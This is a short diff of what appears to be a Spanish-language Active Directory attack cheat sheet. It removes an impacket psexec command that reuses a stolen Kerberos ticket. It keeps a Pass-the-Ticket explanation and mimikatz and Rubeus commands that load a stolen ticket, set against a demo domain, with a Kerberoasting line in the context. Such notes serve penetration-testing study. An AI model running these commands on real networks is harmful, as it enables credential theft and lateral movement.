@@ -246,8 +246,6 @@ Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASC
 
 *Este tipo de ataque es similar a Pass the Key, pero en lugar de usar hashes para solicitar un ticket, el ticket en sí es robado y utilizado para autenticarse como propietario*
 
-`export KRB5CCNAME=/root/impacket-examples/krb5cc_1120601113_ZFxZpK 
-python psexec.py jurassic.park/trex@labwws02.jurassic.park -k -no-pass` # Linux
 
 `mimikatz.exe "kerberos::ptt [0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi" 
 .\Rubeus.exe ptt /ticket:[0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi` #Cargamos el ticket en memoria
